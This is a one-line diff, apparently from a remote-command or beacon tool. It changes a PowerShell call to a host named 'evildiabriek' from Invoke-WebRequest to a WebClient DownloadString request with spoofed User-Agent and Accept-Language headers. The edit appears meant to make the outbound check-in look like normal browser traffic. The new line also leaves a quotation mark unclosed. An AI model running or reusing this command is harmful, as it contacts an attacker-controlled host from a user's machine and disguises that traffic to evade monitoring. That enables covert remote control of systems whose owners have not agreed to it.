@@ -1,1 +1,1 @@
-ExecuteCmd -user -cmd powershell -Command "Invoke-WebRequest https://evildiabriek.pythonanywhere.com/ping"
+ExecuteCmd -user -cmd powershell -c "$wc = New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1)'); $wc.Headers.Add('Accept-Language','fr-FR'); $wc.DownloadString('https://evildiabriek.pythonanywhere.com/ping')
